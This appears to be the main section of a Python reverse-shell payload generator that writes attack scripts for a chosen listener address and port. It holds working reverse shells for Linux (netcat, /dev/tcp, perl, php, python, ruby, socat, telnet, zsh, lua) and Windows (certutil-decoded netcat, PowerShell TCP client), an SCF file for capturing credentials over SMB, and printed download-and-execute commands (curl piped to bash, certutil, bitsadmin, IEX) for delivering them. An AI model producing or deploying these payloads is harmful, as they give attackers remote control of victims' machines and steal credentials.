print(banner)
parser = argparse.ArgumentParser()
parser.add_argument('-i','--ipaddr', type=str,help='LHOST',required=True)
parser.add_argument('-p','--port', type=int ,help='LPORT [Default 9001]',default=9001)
parser.add_argument('-o','--out', type=str ,help='Output File Name [Excluding (.)extension Extension][OPTIONAL]',default="autorev")
parser.add_argument('-f','--format',type=str,help='Define Format for generator [lin | win[c/p](c = cmd | p = powershell) | scf][Default=lin]',default='lin')
parser.add_argument('-s','--server',type=int,help='Port to use for generating commands (http://[your-ip]:[PORT]) (Default 80)',default=80)
args = parser.parse_args()
# nc code
script = f'''
#!/bin/bash

if [ $(which nc >/dev/null ; echo $?) == 0 ];then
    nc -e /bin/bash {args.ipaddr} {args.port}; 
    nc -e /bin/sh {args.ipaddr} {args.port};
    nc -c sh {args.ipaddr} {args.port};
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {args.ipaddr} {args.port} >/tmp/f;
'''
#bash code
script += f'''
elif [ $(which bash >/dev/null ; echo $?) == 0 ];then
    bash -c 'exec bash -i &>/dev/tcp/{args.ipaddr}/{args.port} <&1';
'''
# sh code
script += f'''
elif [ $(which sh >/dev/null ; echo $?) == 0 ];then
    sh -i >& /dev/tcp/{args.ipaddr}/{args.port} 0>&1;
    0<&196;exec 196<>/dev/tcp/{args.ipaddr}/{args.port}; sh <&196 >&196 2>&196;
    exec 5<>/dev/tcp/{args.ipaddr}/{args.port};cat <&5 | while read line; do $line 2>&5 >&5; done;
    sh -i 5<> /dev/tcp/{args.ipaddr}/{args.port} 0<&5 1>&5 2>&5;
    sh -i >& /dev/udp/{args.ipaddr}/{args.port} 0>&1;
'''
# perl codes
script += f'''
elif [ $(which perl >/dev/null ; echo $?) == 0 ];then
    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{args.ipaddr}:{args.port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;';
'''
# php codes
script += f'''
elif [ $(which php >/dev/null ; echo $?) == 0 ];then
    php -r '$sock=fsockopen("{args.ipaddr}",{args.port});exec("sh <&3 >&3 2>&3");';
    php -r '$sock=fsockopen("{args.ipaddr}",{args.port});shell_exec("sh <&3 >&3 2>&3");';
    php -r '$sock=fsockopen("{args.ipaddr}",{args.port});system("sh <&3 >&3 2>&3");';
'''
# python codes
script += f'''
elif [ $(which python >/dev/null ; echo $?) == 0 ];then
    export RHOST="{args.ipaddr}";export RPORT={args.port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")';
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{args.ipaddr}",{args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")';
'''
# python3 codes
script += f'''
elif [ $(which python3 >/dev/null ; echo $?) == 0 ];then
    export RHOST="{args.ipaddr}";export RPORT={args.port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")';
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{args.ipaddr}",{args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")';
'''
#ruby codes
script += f'''
elif [ $(which ruby >/dev/null ; echo $?) == 0 ];then
    ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{args.ipaddr}",{args.port}))';
'''
# socat codes
script += f'''
elif [ $(which socat >/dev/null ; echo $?) == 0 ];then
    socat TCP:{args.ipaddr}:{args.port} EXEC:sh
'''
# telnet codes
script += f'''
elif [ $(which telnet >/dev/null ; echo $?) == 0 ];then
    TF=$(mktemp -u);mkfifo $TF && telnet {args.ipaddr} {args.port} 0<$TF | sh 1>$TF;
'''
# zsh codes
script += f'''
elif [ $(which zsh >/dev/null ; echo $?) == 0 ];then
    zsh -c 'zmodload zsh/net/tcp && ztcp {args.ipaddr} {args.port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY';
'''
# lua codes
script += f'''
elif [ $(which lua >/dev/null ; echo $?) == 0 ];then
    lua -e "require('socket');require('os');t=socket.tcp();t:connect('{args.ipaddr}','{args.port}');os.execute('sh -i <&3 >&3 2>&3');";
fi
'''
# Windows Reverse Shell
winsh = f'''
@echo off
cd %temp%
mkdir {args.out}
cd {args.out}
echo  > nc.encode
echo  >> nc.encode
echo  >> nc.encode
echo  >> nc.encode
echo  >> nc.encode
echo  >> nc.encode
echo  >> nc.encode
echo  >> nc.encode
echo  >> nc.encode
echo  >> nc.encode
certutil.exe -decode nc.encode nc.exe
.\\nc.exe -e cmd.exe {args.ipaddr} {args.port}
'''
# Powershell Basic Reverse Shell
powsh = f'''
$client = New-Object System.Net.Sockets.TCPClient('{args.ipaddr}',{args.port});
'''
powsh +='''
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
'''
# SCF file attack
scf = f'''
[Shell]
Command=2
IconFile=\\\\{args.ipaddr}\Boy\\future.ico
[Taskbar]
Command=ToggleDesktop
'''
format = args.format
if format == "lin":
    open(f'{args.out}.sh','w').write(script)
    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}üë®‚Äçüíª Generated linux shell file "{args.out}.sh" for {args.ipaddr}:{args.port}')
    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "curl"{bcolors.WARNING}‚ùØ curl http://{args.ipaddr}:{args.server}/{args.out}.sh | bash')
    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "wget"{bcolors.WARNING}‚ùØ wget http://{args.ipaddr}:{args.server}/{args.out}.sh -O /tmp/{args.out}.sh && bash /tmp/{args.out}.sh')
elif format == "winc":
    open(f'{args.out}.bat','w').write(winsh)
    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}üë®‚Äçüíª Generated windows batch file "{args.out}.bat" for {args.ipaddr}:{args.port}')
    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "certutil"{bcolors.WARNING}‚ùØ certutil.exe -urlcache -split -f http://{args.ipaddr}:{args.server}/{args.out}.bat %temp%/{args.out}.bat && %temp%\\{args.out}.bat')
    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "bitsadmin"{bcolors.WARNING}‚ùØ bitsadmin /create 1 bitsadmin /addfile 1 http://{args.ipaddr}:{args.server}/{args.out}.bat %temp%\\{args.out}.bat bitsadmin /RESUME 1 bitsadmin /complete 1')
elif format == "winp":
    open(f'{args.out}.ps1','w').write(powsh)
    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}üë®‚Äçüíª Generated windows ps1 file "{args.out}.ps1" for {args.ipaddr}:{args.port}')
    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "IWR"{bcolors.WARNING}‚ùØ mkdir \\bff ;IWR -Uri http://{args.ipaddr}:{args.server}/{args.out}.ps1 -OutFile \\bff\\{args.out}.ps1 ; powershell.exe -ep bypass Import-Module \\bff\\{args.out}.ps1')
    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "IEX"{bcolors.WARNING}‚ùØ powershell.exe -ep bypass -Command \"IEX(New-Object Net.WebClient).DownloadString(\'http://{args.ipaddr}:{args.server}/{args.out}.ps1\')\"')
elif format == 'scf':
    open(f'@{args.out}.scf','w').write(scf)
    print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}üë®‚Äçüíª Generated scf file "@{args.out}.scf" for {args.ipaddr}')
else:
    print("Only [lin | win | scf] formats are available")

